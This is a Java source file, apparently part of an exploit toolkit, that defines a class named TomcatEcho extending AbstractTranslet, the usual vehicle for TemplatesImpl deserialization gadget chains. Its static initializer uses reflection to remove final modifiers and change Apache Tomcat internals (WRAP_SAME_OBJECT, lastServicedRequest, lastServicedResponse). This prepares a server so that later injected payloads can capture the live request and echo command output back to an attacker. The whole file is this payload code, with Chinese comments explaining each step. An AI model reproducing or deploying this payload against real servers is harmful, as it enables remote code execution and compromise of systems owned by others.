package EXP;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Modifier;

public class TomcatEcho extends AbstractTranslet {

    static {
        try {
            // 修改 WRAP_SAME_OBJECT 值为 true
            Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");    //获取modifiers字段
            modifiersField.setAccessible(true);   //将变量设置为可访问
            modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL); //取消FINAL属性
            f.setAccessible(true);    //将变量设置为可访问
            if (!f.getBoolean(null)) {
                f.setBoolean(null, true); //将变量设置为true
            }

            // 初始化 lastServicedRequest & lastServicedResponse
            c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            f = c.getDeclaredField("lastServicedRequest");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
                f.set(null, new ThreadLocal());   //设置ThreadLocal对象
            }

            f = c.getDeclaredField("lastServicedResponse");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
                f.set(null, new ThreadLocal());   //设置ThreadLocal对象
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }
}

